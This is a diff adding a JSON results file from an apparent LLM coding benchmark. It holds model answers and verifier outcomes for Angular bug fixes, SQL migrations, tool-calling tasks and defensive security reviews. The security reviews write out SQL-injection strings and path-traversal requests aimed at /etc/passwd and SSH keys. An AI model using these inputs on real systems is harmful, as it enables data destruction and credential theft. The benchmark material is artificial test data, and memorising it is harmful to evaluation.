+            "response_excerpt": "```ts\nimport { AbstractControl, ValidationErrors, ValidatorFn } from '@angular/forms';\n\n/**\n * A cross-field validator to be applied at the FormGroup level, checking\n * that the 'password' and 'confirmPassword' controls have matching\n * values. Should set a `passwordMismatch` error on the confirmPassword\n * control when they differ, and clear it when they match.\n */\nexport function passwordMatchValidator(): ValidatorFn {\n  return (group: AbstractControl): ValidationErrors | null => {\n    const password = group.get('password');\n    const confirmPassword = group.get('confirmPassword');\n    if (!password || !confirmPassword) {\n      return null;\n    }\n\n    if (password.value !== confirmPassword.value) {\n      confirmPassword.setErrors({ passwordMismatch: true });\n      return { passwordMismatch: true };\n    }\n\n    if (confirmPassword.hasError('passwordMismatch')) {\n      const errors = { ...confirmPassword.errors };\n      delete errors['passwordMismatch'];\n      confirmPassword.setErrors(Object.keys(errors).length ? errors : null);\n    }\n    return null;\n  };\n}\n```",
+            "candidate_ts": "import { AbstractControl, ValidationErrors, ValidatorFn } from '@angular/forms';\n\n/**\n * A cross-field validator to be applied at the FormGroup level, checking\n * that the 'password' and 'confirmPassword' controls have matching\n * values. Should set a `passwordMismatch` error on the confirmPassword\n * control when they differ, and clear it when they match.\n */\nexport function passwordMatchValidator(): ValidatorFn {\n  return (group: AbstractControl): ValidationErrors | null => {\n    const password = group.get('password');\n    const confirmPassword = group.get('confirmPassword');\n    if (!password || !confirmPassword) {\n      return null;\n    }\n\n    if (password.value !== confirmPassword.value) {\n      confirmPassword.setErrors({ passwordMismatch: true });\n      return { passwordMismatch: true };\n    }\n\n    if (confirmPassword.hasError('passwordMismatch')) {\n      const errors = { ...confirmPassword.errors };\n      delete errors['passwordMismatch'];\n      confirmPassword.setErrors(Object.keys(errors).length ? errors : null);\n    }\n    return null;\n  };\n}\n",
+            "candidate_length": 1069,
+            "verifier": {
+              "command": [
+                "npx",
+                "ng",
+                "test",
+                "--include=src/app/bugs/password-match.validator.spec.ts",
+                "--watch=false"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "05-ticker-component",
+          "passed": true,
+          "elapsed_s": 5.9,
+          "reasons": [],
+          "artifact": {
+            "task_id": "05-ticker-component",
+            "category": "ts-angular",
+            "file_name": "ticker.component.ts",
+            "spec_name": "ticker.component.spec.ts",
+            "response_length": 917,
+            "response_excerpt": "```ts\nimport { Component, OnDestroy, OnInit, signal } from '@angular/core';\nimport { Subscription, interval } from 'rxjs';\n\n/**\n * Displays a tick counter that increments once per second while the\n * component is alive. The subscription to the ticking interval MUST be\n * torn down when the component is destroyed -- otherwise the interval\n * keeps firing and updating state forever, leaking memory/CPU for every\n * instance ever created (a very common Angular component bug).\n */\n@Component({\n  selector: 'app-ticker',\n  standalone: true,\n  template: `<span>{{ count() }}</span>`,\n})\nexport class TickerComponent implements OnInit, OnDestroy {\n  readonly count = signal(0);\n\n  private subscription?: Subscription;\n\n  ngOnInit(): void {\n    this.subscription = interval(1000).subscribe(() => {\n      this.count.update((c) => c + 1);\n    });\n  }\n\n  ngOnDestroy(): void {\n    this.subscription?.unsubscribe();\n  }\n}\n```",
+            "candidate_ts": "import { Component, OnDestroy, OnInit, signal } from '@angular/core';\nimport { Subscription, interval } from 'rxjs';\n\n/**\n * Displays a tick counter that increments once per second while the\n * component is alive. The subscription to the ticking interval MUST be\n * torn down when the component is destroyed -- otherwise the interval\n * keeps firing and updating state forever, leaking memory/CPU for every\n * instance ever created (a very common Angular component bug).\n */\n@Component({\n  selector: 'app-ticker',\n  standalone: true,\n  template: `<span>{{ count() }}</span>`,\n})\nexport class TickerComponent implements OnInit, OnDestroy {\n  readonly count = signal(0);\n\n  private subscription?: Subscription;\n\n  ngOnInit(): void {\n    this.subscription = interval(1000).subscribe(() => {\n      this.count.update((c) => c + 1);\n    });\n  }\n\n  ngOnDestroy(): void {\n    this.subscription?.unsubscribe();\n  }\n}\n",
+            "candidate_length": 908,
+            "verifier": {
+              "command": [
+                "npx",
+                "ng",
+                "test",
+                "--include=src/app/bugs/ticker.component.spec.ts",
+                "--watch=false"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "06-todo-list-component",
+          "passed": true,
+          "elapsed_s": 8.5,
+          "reasons": [],
+          "artifact": {
+            "task_id": "06-todo-list-component",
+            "category": "ts-angular",
+            "file_name": "todo-list.component.ts",
+            "spec_name": "todo-list.component.spec.ts",
+            "response_length": 1224,
+            "response_excerpt": "```ts\nimport { ChangeDetectionStrategy, Component, EventEmitter, Input, Output } from '@angular/core';\n\nexport interface Todo {\n  id: number;\n  text: string;\n  done: boolean;\n}\n\n/**\n * An OnPush component that displays a list of todos and lets the parent\n * toggle one via `toggle`. Because it runs OnPush, Angular only checks\n * this component for changes when one of its @Input() REFERENCES changes\n * (or a signal/event fires) -- mutating the existing array/object in\n * place is not enough to trigger a re-render from a parent's perspective,\n * and (worse here) corrupts the parent's original array unexpectedly.\n */\n@Component({\n  selector: 'app-todo-list',\n  standalone: true,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  template: `\n    @for (todo of todos; track todo.id) {\n      <label>\n        <input type=\"checkbox\" [checked]=\"todo.done\" (change)=\"onToggle(todo.id)\" />\n        {{ todo.text }}\n      </label>\n    }\n  `,\n})\nexport class TodoListComponent {\n  @Input() todos: Todo[] = [];\n  @Output() toggle = new EventEmitter<Todo[]>();\n\n  onToggle(id: number): void {\n    const updated = this.todos.map((t) =>\n      t.id === id ? { ...t, done: !t.done } : t\n    );\n    this.toggle.emit(updated);\n  }\n}\n```",
+            "candidate_ts": "import { ChangeDetectionStrategy, Component, EventEmitter, Input, Output } from '@angular/core';\n\nexport interface Todo {\n  id: number;\n  text: string;\n  done: boolean;\n}\n\n/**\n * An OnPush component that displays a list of todos and lets the parent\n * toggle one via `toggle`. Because it runs OnPush, Angular only checks\n * this component for changes when one of its @Input() REFERENCES changes\n * (or a signal/event fires) -- mutating the existing array/object in\n * place is not enough to trigger a re-render from a parent's perspective,\n * and (worse here) corrupts the parent's original array unexpectedly.\n */\n@Component({\n  selector: 'app-todo-list',\n  standalone: true,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  template: `\n    @for (todo of todos; track todo.id) {\n      <label>\n        <input type=\"checkbox\" [checked]=\"todo.done\" (change)=\"onToggle(todo.id)\" />\n        {{ todo.text }}\n      </label>\n    }\n  `,\n})\nexport class TodoListComponent {\n  @Input() todos: Todo[] = [];\n  @Output() toggle = new EventEmitter<Todo[]>();\n\n  onToggle(id: number): void {\n    const updated = this.todos.map((t) =>\n      t.id === id ? { ...t, done: !t.done } : t\n    );\n    this.toggle.emit(updated);\n  }\n}\n",
+            "candidate_length": 1215,
+            "verifier": {
+              "command": [
+                "npx",
+                "ng",
+                "test",
+                "--include=src/app/bugs/todo-list.component.spec.ts",
+                "--watch=false"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "07-counter-display-component",
+          "passed": true,
+          "elapsed_s": 7.1,
+          "reasons": [],
+          "artifact": {
+            "task_id": "07-counter-display-component",
+            "category": "ts-angular",
+            "file_name": "counter-display.component.ts",
+            "spec_name": "counter-display.component.spec.ts",
+            "response_length": 611,
+            "response_excerpt": "```ts\nimport { Component } from '@angular/core';\nimport { CounterService } from './counter.service';\n\n/**\n * Displays and increments the shared app-wide counter. Every instance of\n * this component (e.g. two siblings on the same page) must read/write the\n * SAME underlying counter, since CounterService is `providedIn: 'root'`.\n */\n@Component({\n  selector: 'app-counter-display',\n  standalone: true,\n  template: `\n    <button (click)=\"counter.increment()\">+1</button>\n    <span>{{ counter.count() }}</span>\n  `,\n})\nexport class CounterDisplayComponent {\n  constructor(readonly counter: CounterService) {}\n}\n```",
+            "candidate_ts": "import { Component } from '@angular/core';\nimport { CounterService } from './counter.service';\n\n/**\n * Displays and increments the shared app-wide counter. Every instance of\n * this component (e.g. two siblings on the same page) must read/write the\n * SAME underlying counter, since CounterService is `providedIn: 'root'`.\n */\n@Component({\n  selector: 'app-counter-display',\n  standalone: true,\n  template: `\n    <button (click)=\"counter.increment()\">+1</button>\n    <span>{{ counter.count() }}</span>\n  `,\n})\nexport class CounterDisplayComponent {\n  constructor(readonly counter: CounterService) {}\n}\n",
+            "candidate_length": 602,
+            "verifier": {
+              "command": [
+                "npx",
+                "ng",
+                "test",
+                "--include=src/app/bugs/counter-display.component.spec.ts",
+                "--watch=false"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "08-batch-processor",
+          "passed": true,
+          "elapsed_s": 5.5,
+          "reasons": [],
+          "artifact": {
+            "task_id": "08-batch-processor",
+            "category": "ts-angular",
+            "file_name": "batch-processor.ts",
+            "spec_name": "batch-processor.spec.ts",
+            "response_length": 594,
+            "response_excerpt": "```ts\n/**\n * Processes a list of items one at a time by calling an async\n * `processOne` function for each, collecting all results in the same\n * order as the input. If any item fails, the whole batch should fail\n * (reject) with that error -- partial/incomplete results must never be\n * returned as if the batch succeeded.\n */\nexport async function processBatch<T, R>(\n  items: T[],\n  processOne: (item: T) => Promise<R>,\n): Promise<R[]> {\n  const results: R[] = [];\n  for (const item of items) {\n    const result = await processOne(item);\n    results.push(result);\n  }\n  return results;\n}\n```",
+            "candidate_ts": "/**\n * Processes a list of items one at a time by calling an async\n * `processOne` function for each, collecting all results in the same\n * order as the input. If any item fails, the whole batch should fail\n * (reject) with that error -- partial/incomplete results must never be\n * returned as if the batch succeeded.\n */\nexport async function processBatch<T, R>(\n  items: T[],\n  processOne: (item: T) => Promise<R>,\n): Promise<R[]> {\n  const results: R[] = [];\n  for (const item of items) {\n    const result = await processOne(item);\n    results.push(result);\n  }\n  return results;\n}\n",
+            "candidate_length": 585,
+            "verifier": {
+              "command": [
+                "npx",
+                "ng",
+                "test",
+                "--include=src/app/bugs/batch-processor.spec.ts",
+                "--watch=false"
+              ],
+              "returncode": 0
+            }
+          }
+        }
+      ],
+      "artifact_count": 8,
+      "logs": []
+    },
+    {
+      "category": "sql-migrations",
+      "n_pass": 5,
+      "n_total": 6,
+      "wall_s": 40.52815365791321,
+      "returncode": 1,
+      "timed_out": false,
+      "tasks": [
+        {
+          "id": "01-add-column-not-null",
+          "passed": true,
+          "elapsed_s": 2.5,
+          "reasons": [],
+          "artifact": {
+            "task_id": "01-add-column-not-null",
+            "category": "sql-migrations",
+            "task_dir": "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/01-add-column-not-null",
+            "response_length": 103,
+            "response_excerpt": "```sql\nALTER TABLE orders ADD COLUMN IF NOT EXISTS shipping_status TEXT NOT NULL DEFAULT 'pending';\n```",
+            "candidate_sql": "ALTER TABLE orders ADD COLUMN IF NOT EXISTS shipping_status TEXT NOT NULL DEFAULT 'pending';\n",
+            "candidate_length": 93,
+            "verifier": {
+              "command": [
+                "bash",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/verify.sh",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/01-add-column-not-null",
+                "up.candidate.sql"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "02-unique-constraint-dupes",
+          "passed": false,
+          "elapsed_s": 8.5,
+          "reasons": [
+            "verify.sh failed (exit 1):",
+            "== Task: /home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/02-unique-constraint-dupes =="
+          ],
+          "artifact": {
+            "task_id": "02-unique-constraint-dupes",
+            "category": "sql-migrations",
+            "task_dir": "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/02-unique-constraint-dupes",
+            "response_length": 195,
+            "response_excerpt": "```sql\nUPDATE users\nSET email = email || '+' || id::text\nWHERE id NOT IN (\n    SELECT MIN(id) FROM users GROUP BY email\n);\n\nCREATE UNIQUE INDEX IF NOT EXISTS users_email_key ON users (email);\n```",
+            "candidate_sql": "UPDATE users\nSET email = email || '+' || id::text\nWHERE id NOT IN (\n    SELECT MIN(id) FROM users GROUP BY email\n);\n\nCREATE UNIQUE INDEX IF NOT EXISTS users_email_key ON users (email);\n",
+            "candidate_length": 185,
+            "verifier": {
+              "command": [
+                "bash",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/verify.sh",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/02-unique-constraint-dupes",
+                "up.candidate.sql"
+              ],
+              "returncode": 1,
+              "output_tail": "== Task: /home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/02-unique-constraint-dupes ==\n== Migration file: up.candidate.sql ==\nCREATE DATABASE\n-- Applying seed.sql --\nCREATE TABLE\nINSERT 0 4\n-- Applying up.candidate.sql (dry-run of the migration under test) --\nUPDATE 1\nCREATE INDEX\n-- Running check.sql --\nno_rows_deleted|t\nunique_constraint_exists|f\nduplicate_insert_rejected|t\nFAIL: check 'unique_constraint_exists' returned 'f' (expected 't')"
+            }
+          }
+        },
+        {
+          "id": "03-rename-column-view",
+          "passed": true,
+          "elapsed_s": 6.6,
+          "reasons": [],
+          "artifact": {
+            "task_id": "03-rename-column-view",
+            "category": "sql-migrations",
+            "task_dir": "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/03-rename-column-view",
+            "response_length": 550,
+            "response_excerpt": "```sql\nDROP VIEW IF EXISTS low_stock_products;\n\nALTER TABLE products ADD COLUMN IF NOT EXISTS quantity_in_stock INTEGER NOT NULL DEFAULT 0;\n\nDO $$\nBEGIN\n    IF EXISTS (\n        SELECT 1 FROM information_schema.columns\n        WHERE table_name = 'products' AND column_name = 'qty'\n    ) THEN\n        UPDATE products SET quantity_in_stock = qty;\n        ALTER TABLE products DROP COLUMN qty;\n    END IF;\nEND\n$$;\n\nCREATE OR REPLACE VIEW low_stock_products AS\n    SELECT id, name, quantity_in_stock\n    FROM products\n    WHERE quantity_in_stock < 10;\n```",
+            "candidate_sql": "DROP VIEW IF EXISTS low_stock_products;\n\nALTER TABLE products ADD COLUMN IF NOT EXISTS quantity_in_stock INTEGER NOT NULL DEFAULT 0;\n\nDO $$\nBEGIN\n    IF EXISTS (\n        SELECT 1 FROM information_schema.columns\n        WHERE table_name = 'products' AND column_name = 'qty'\n    ) THEN\n        UPDATE products SET quantity_in_stock = qty;\n        ALTER TABLE products DROP COLUMN qty;\n    END IF;\nEND\n$$;\n\nCREATE OR REPLACE VIEW low_stock_products AS\n    SELECT id, name, quantity_in_stock\n    FROM products\n    WHERE quantity_in_stock < 10;\n",
+            "candidate_length": 540,
+            "verifier": {
+              "command": [
+                "bash",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/verify.sh",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/03-rename-column-view",
+                "up.candidate.sql"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "04-non-idempotent-migration",
+          "passed": true,
+          "elapsed_s": 10.7,
+          "reasons": [],
+          "artifact": {
+            "task_id": "04-non-idempotent-migration",
+            "category": "sql-migrations",
+            "task_dir": "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/04-non-idempotent-migration",
+            "response_length": 352,
+            "response_excerpt": "```sql\nALTER TABLE accounts ADD COLUMN IF NOT EXISTS is_active BOOLEAN NOT NULL DEFAULT true;\n\nCREATE INDEX IF NOT EXISTS idx_accounts_is_active ON accounts (is_active);\n\nCREATE TABLE IF NOT EXISTS account_tiers (\n    name TEXT PRIMARY KEY\n);\n\nINSERT INTO account_tiers (name) VALUES ('free'), ('pro'), ('enterprise') ON CONFLICT (name) DO NOTHING;\n```",
+            "candidate_sql": "ALTER TABLE accounts ADD COLUMN IF NOT EXISTS is_active BOOLEAN NOT NULL DEFAULT true;\n\nCREATE INDEX IF NOT EXISTS idx_accounts_is_active ON accounts (is_active);\n\nCREATE TABLE IF NOT EXISTS account_tiers (\n    name TEXT PRIMARY KEY\n);\n\nINSERT INTO account_tiers (name) VALUES ('free'), ('pro'), ('enterprise') ON CONFLICT (name) DO NOTHING;\n",
+            "candidate_length": 342,
+            "verifier": {
+              "command": [
+                "bash",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/verify.sh",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/04-non-idempotent-migration",
+                "up.candidate.sql"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "05-fk-missing-unique-target",
+          "passed": true,
+          "elapsed_s": 8.2,
+          "reasons": [],
+          "artifact": {
+            "task_id": "05-fk-missing-unique-target",
+            "category": "sql-migrations",
+            "task_dir": "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/05-fk-missing-unique-target",
+            "response_length": 461,
+            "response_excerpt": "```sql\nALTER TABLE warehouses\n    ADD CONSTRAINT warehouses_code_unique UNIQUE (code);\n\nALTER TABLE shipments ADD COLUMN IF NOT EXISTS warehouse_code TEXT;\n\nDO $$\nBEGIN\n    IF NOT EXISTS (\n        SELECT 1 FROM pg_constraint WHERE conname = 'fk_shipments_warehouse_code'\n    ) THEN\n        ALTER TABLE shipments\n            ADD CONSTRAINT fk_shipments_warehouse_code\n            FOREIGN KEY (warehouse_code) REFERENCES warehouses (code);\n    END IF;\nEND\n$$;\n```",
+            "candidate_sql": "ALTER TABLE warehouses\n    ADD CONSTRAINT warehouses_code_unique UNIQUE (code);\n\nALTER TABLE shipments ADD COLUMN IF NOT EXISTS warehouse_code TEXT;\n\nDO $$\nBEGIN\n    IF NOT EXISTS (\n        SELECT 1 FROM pg_constraint WHERE conname = 'fk_shipments_warehouse_code'\n    ) THEN\n        ALTER TABLE shipments\n            ADD CONSTRAINT fk_shipments_warehouse_code\n            FOREIGN KEY (warehouse_code) REFERENCES warehouses (code);\n    END IF;\nEND\n$$;\n",
+            "candidate_length": 451,
+            "verifier": {
+              "command": [
+                "bash",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/verify.sh",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/05-fk-missing-unique-target",
+                "up.candidate.sql"
+              ],
+              "returncode": 0
+            }
+          }
+        },
+        {
+          "id": "06-bad-backfill-update",
+          "passed": true,
+          "elapsed_s": 3.9,
+          "reasons": [],
+          "artifact": {
+            "task_id": "06-bad-backfill-update",
+            "category": "sql-migrations",
+            "task_dir": "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/06-bad-backfill-update",
+            "response_length": 140,
+            "response_excerpt": "```sql\nUPDATE orders\nSET discount_percent = discount_codes.percent\nFROM discount_codes\nWHERE orders.discount_code = discount_codes.code;\n```",
+            "candidate_sql": "UPDATE orders\nSET discount_percent = discount_codes.percent\nFROM discount_codes\nWHERE orders.discount_code = discount_codes.code;\n",
+            "candidate_length": 130,
+            "verifier": {
+              "command": [
+                "bash",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/verify.sh",
+                "/home/berdachuk/projects-llm-test/llm-tests/qualbench/fixtures/sql-migrations/06-bad-backfill-update",
+                "up.candidate.sql"
+              ],
+              "returncode": 0
+            }
+          }
+        }
+      ],
+      "artifact_count": 6,
+      "logs": [
+        "== Migration file: up.candidate.sql ==",
+        "CREATE DATABASE",
+        "-- Applying seed.sql --",
+        "CREATE TABLE",
+        "INSERT 0 4",
+        "-- Applying up.candidate.sql (dry-run of the migration under test) --",
+        "UPDATE 1",
+        "CREATE INDEX",
+        "-- Running check.sql --",
+        "no_rows_deleted|t",
+        "unique_constraint_exists|f",
+        "duplicate_insert_rejected|t",
+        "FAIL: check 'unique_constraint_exists' returned 'f' (expected 't')"
+      ]
+    },
+    {
+      "category": "mcp-tools",
+      "n_pass": 8,
+      "n_total": 8,
+      "wall_s": 13.986686706542969,
+      "returncode": 0,
+      "timed_out": false,
+      "tasks": [
+        {
+          "id": "01-single-tool-required-args",
+          "passed": true,
+          "elapsed_s": 1.7,
+          "reasons": [],
+          "artifact": {
+            "task_id": "01-single-tool-required-args",
+            "category": "mcp-tools",
+            "finish_reason": "tool_calls",
+            "tool_call_count": 1,
+            "tool_call_names": [
+              "get_weather"
+            ],
+            "response_excerpt": "The user wants to know the current weather in Tokyo in Fahrenheit. I have a get_weather tool that can provide this information. I'll call it with city \"Tokyo\" and unit \"fahrenheit\".\n"
+          }
+        },
+        {
+          "id": "02-enum-selection",
+          "passed": true,
+          "elapsed_s": 1.8,
+          "reasons": [],
+          "artifact": {
+            "task_id": "02-enum-selection",
+            "category": "mcp-tools",
+            "finish_reason": "tool_calls",
+            "tool_call_count": 1,
+            "tool_call_names": [
+              "create_ticket"
+            ],
+            "response_excerpt": "The user is reporting a critical production database outage that is affecting customers' ability to check out. This is clearly an emergency situation. They've asked me to file a ticket with the title 'Production DB outage' and treat it as an emergency. I should file this with the highest priority level available, which is \"urgent\".\n"
+          }
+        },
+        {
+          "id": "03-numeric-coercion",
+          "passed": true,
+          "elapsed_s": 1.8,
+          "reasons": [],
+          "artifact": {
+            "task_id": "03-numeric-coercion",
+            "category": "mcp-tools",
+            "finish_reason": "tool_calls",
+            "tool_call_count": 1,
+            "tool_call_names": [
+              "apply_discount"
+            ],
+            "response_excerpt": "The user wants me to apply a 15% discount to an item that costs $49.99. I need to convert $49.99 to cents, which is 4999 cents, and apply a discount rate of 0.15.\n"
+          }
+        },
+        {
+          "id": "04-nested-object-args",
+          "passed": true,
+          "elapsed_s": 2.1,
+          "reasons": [],
+          "artifact": {
+            "task_id": "04-nested-object-args",
+            "category": "mcp-tools",
+            "finish_reason": "tool_calls",
+            "tool_call_count": 1,
+            "tool_call_names": [
+              "create_shipping_label"
+            ],
+            "response_excerpt": "The user wants me to create a shipping label for Maria Gonzalez with the address details provided. Let me map the information to the required parameters:\n\n- recipient_name: Maria Gonzalez\n- address:\n  - street: 42 Rue de Rivoli\n  - city: Paris\n  - postal_code: 75004\n  - country: France\n\nAll required fields are provided, so I can make the function call directly.\n"
+          }
+        },
+        {
+          "id": "05-tool-disambiguation",
+          "passed": true,
+          "elapsed_s": 1.8,
+          "reasons": [],
+          "artifact": {
+            "task_id": "05-tool-disambiguation",
+            "category": "mcp-tools",
+            "finish_reason": "tool_calls",
+            "tool_call_count": 1,
+            "tool_call_names": [
+              "create_calendar_event"
+            ],
+            "response_excerpt": "The user wants me to create a new calendar event with the title \"Q3 Planning\" and the start time 2026-09-10T14:00:00Z. This is a straightforward creation request with no dependencies, so I can call the create_calendar_event function directly.\n"
+          }
+        },
+        {
+          "id": "06-missing-info-no-premature-call",
+          "passed": true,
+          "elapsed_s": 1.4,
+          "reasons": [],
+          "artifact": {
+            "task_id": "06-missing-info-no-premature-call",
+            "category": "mcp-tools",
+            "finish_reason": "stop",
+            "tool_call_count": 0,
+            "tool_call_names": [],
+            "response_excerpt": "I'd be happy to help you send $50 to Jake! However, I need his **account ID** to process the transfer. Could you please provide Jake's account ID?"
+          }
+        },
+        {
+          "id": "07-multi-step-context-carry",
+          "passed": true,
+          "elapsed_s": 1.4,
+          "reasons": [],
+          "artifact": {
+            "task_id": "07-multi-step-context-carry",
+            "category": "mcp-tools",
+            "finish_reason": "tool_calls",
+            "tool_call_count": 1,
+            "tool_call_names": [
+              "issue_refund"
+            ],
+            "response_excerpt": "I found the customer_id. Now I'll issue the refund of $30, which is 3000 cents.\n"
+          }
+        },
+        {
+          "id": "08-array-argument",
+          "passed": true,
+          "elapsed_s": 1.8,
+          "reasons": [],
+          "artifact": {
+            "task_id": "08-array-argument",
+            "category": "mcp-tools",
+            "finish_reason": "tool_calls",
+            "tool_call_count": 1,
+            "tool_call_names": [
+              "invite_to_meeting"
+            ],
+            "response_excerpt": "The user wants to invite three people to meeting MTG-77. This is a single action with all the required information provided:\n- meeting_id: MTG-77\n- attendee_emails: alice@corp.com, bob@corp.com, carla@corp.com\n\nI can make this call directly.\n"
+          }
+        }
+      ],
+      "artifact_count": 8,
+      "logs": []
+    },
+    {
+      "category": "security-review",
+      "n_pass": 7,
+      "n_total": 8,
+      "wall_s": 86.40381097793579,
+      "returncode": 1,
+      "timed_out": false,
+      "tasks": [
+        {
+          "id": "01-sql-injection",
+          "passed": true,
+          "elapsed_s": 7.5,
+          "reasons": [],
+          "artifact": {
+            "task_id": "01-sql-injection",
+            "category": "security-review",
+            "response_length": 3332,
+            "response_excerpt": "# Security Review: `findUserByUsername`\n\n## \ud83d\udd34 Critical: SQL Injection\n\n**Location:** Line 3 \u2014 string concatenation of user input into the query.\n\n```java\nString query = \"SELECT * FROM users WHERE username = '\" + username + \"'\";\n```\n\n**Impact:** An attacker can manipulate the `username` parameter to alter the SQL query's logic. Example payloads:\n\n| Input | Resulting Query Effect |\n|-------|----------------------|\n| `' OR '1'='1` | Returns the first user in the table (auth bypass) |\n| `' OR 1=1 LIMIT 1 --` | Same as above, bypasses the closing quote |\n| `'; DROP TABLE users; --` | Destroys the table (if multi-statement is enabled) |\n| `' UNION SELECT password_hash, email, id FROM admin --` | Extracts sensitive data from other tables |\n\n**Fix:** Use a `PreparedStatement` with parameterized queries.\n\n```java\npublic User findUserByUsername(Connection conn, String username) throws SQLException {\n    String query = \"SELECT id, username, email FROM users WHERE username = ?\";\n    try (PreparedStatement stmt = conn.prepareStatement(query)) {\n        stmt.setString(1, username);\n        try (ResultSet rs = stmt.executeQuery()) {\n            if (rs.next()) {\n                return new User(rs.getInt(\"id\"), rs.getString(\"username\"), rs.getString(\"email\"));\n            }\n            return null;\n        }\n    }\n}\n```\n\n---\n\n## \ud83d\udfe1 Medium: Over-Privileged Data Retrieval (`SELECT *`)\n\n**Location:** Line 3 \u2014 `SELECT *` fetches all columns.\n\n**Impact:** If the `users` table contains sensitive columns (e.g., `password_hash`, `security_question`, `mfa_secret`, `credit_card`), they are loaded into memory and could be inadvertently exposed through logging, serialization, or future code changes.\n\n**Fix:** Explicitly list only the columns you need:\n\n```java\nString query = \"SELECT id, username, email FROM users WHERE username = ?\";\n```\n\n---\n\n## \ud83d\udfe1 Medium: No Input Validation\n\n**Location:** The `username` parameter is used without any validation.\n\n**Impact:** Even with parameterized queries, unb... [truncated]"
+          }
+        },
+        {
+          "id": "02-hardcoded-secret",
+          "passed": true,
+          "elapsed_s": 8.5,
+          "reasons": [],
+          "artifact": {
+            "task_id": "02-hardcoded-secret",
+            "category": "security-review",
+            "response_length": 3014,
+            "response_excerpt": "# Security Review\n\n## 1. Hardcoded API Key (Critical)\n\n**Issue:** The Stripe secret key is embedded directly in source code. This exposes it to anyone with repository access, logs, stack traces, or backups.\n\n**Fix:** Load the key from an environment variable or a secrets manager.\n\n```python\nimport os\n\nSTRIPE_API_KEY = os.environ[\"STRIPE_API_KEY\"]\n```\n\n---\n\n## 2. Insecure Direct Object Reference (IDOR) \u2014 Missing Authorization (Critical)\n\n**Issue:** The function accepts any `customer_id` without verifying that the caller is authorized to charge that customer. An attacker could substitute another user's customer ID and trigger charges on their account.\n\n**Fix:** Validate ownership before calling the API.\n\n```python\ndef charge_customer(caller_user_id: str, customer_id: str, amount_cents: int) -> dict:\n    # Verify the caller owns this customer record\n    if not customer_belongs_to_user(customer_id, caller_user_id):\n        raise PermissionError(\"Not authorized to charge this customer\")\n    ...\n```\n\n---\n\n## 3. Unvalidated `amount_cents` Input (High)\n\n**Issue:** No bounds checking on the amount. A caller could pass a negative value, zero, or an absurdly large number.\n\n**Fix:**\n\n```python\nif not isinstance(amount_cents, int) or amount_cents <= 0:\n    raise ValueError(\"amount_cents must be a positive integer\")\nif amount_cents > 100_000:  # e.g., $1,000 cap\n    raise ValueError(\"amount exceeds maximum allowed\")\n```\n\n---\n\n## 4. Missing Request Timeout (Medium)\n\n**Issue:** `requests.post()` without a `timeout` can hang indefinitely, exhausting server threads/connections and enabling a slowloris-style DoS.\n\n**Fix:**\n\n```python\nresponse = requests.post(\n    ...,\n    timeout=(5, 30),  # (connect, read) in seconds\n)\n```\n\n---\n\n## 5. No Idempotency Key (Medium)\n\n**Issue:** Stripe supports an `Idempotency-Key` header to prevent duplicate charges on retries. Without it, a network retry or client bug could charge the customer multiple times.\n\n**Fix:**\n\n```python\nimport uuid\n\nresponse =... [truncated]"
+          }
+        },
+        {
+          "id": "03-path-traversal",
+          "passed": true,
+          "elapsed_s": 11.0,
+          "reasons": [],
+          "artifact": {
+            "task_id": "03-path-traversal",
+            "category": "security-review",
+            "response_length": 4104,
+            "response_excerpt": "# Security Review\n\n## 1. Path Traversal (Critical)\n\n**Location:** `path.join(UPLOADS_DIR, filename)`\n\n`path.join` **normalizes** the path, meaning `../` sequences are resolved rather than blocked. An attacker can escape the uploads directory entirely:\n\n```\nGET /download?file=../../etc/passwd\nGET /download?file=../../../var/app/.env\nGET /download?file=../../../root/.ssh/id_rsa\n```\n\n`path.join('/var/app/uploads', '../../etc/passwd')` resolves to `/etc/passwd`.\n\n**Fix:** Resolve the path and verify it stays within the intended directory:\n\n```js\nconst resolvedPath = path.resolve(UPLOADS_DIR, filename);\nif (!resolvedPath.startsWith(UPLOADS_DIR + path.sep)) {\n    return res.status(400).send('Invalid file path');\n}\n```\n\n---\n\n## 2. No Authentication / Authorization (High)\n\nThe endpoint is completely unauthenticated. Anyone on the network can download any accessible file.\n\n**Fix:** Add authentication middleware and verify the requesting user has permission to access the file:\n\n```js\napp.get('/download', requireAuth, requireOwnership, (req, res) => { ... });\n```\n\n---\n\n## 3. No Input Validation (High)\n\nThe `filename` parameter is used directly with no checks. It could be:\n- `undefined` (causes `path.join` to throw)\n- An absolute path like `/etc/passwd` (on some systems, `path.join` with an absolute second arg replaces the first)\n- Extremely long strings (DoS)\n\n**Fix:**\n\n```js\nconst filename = 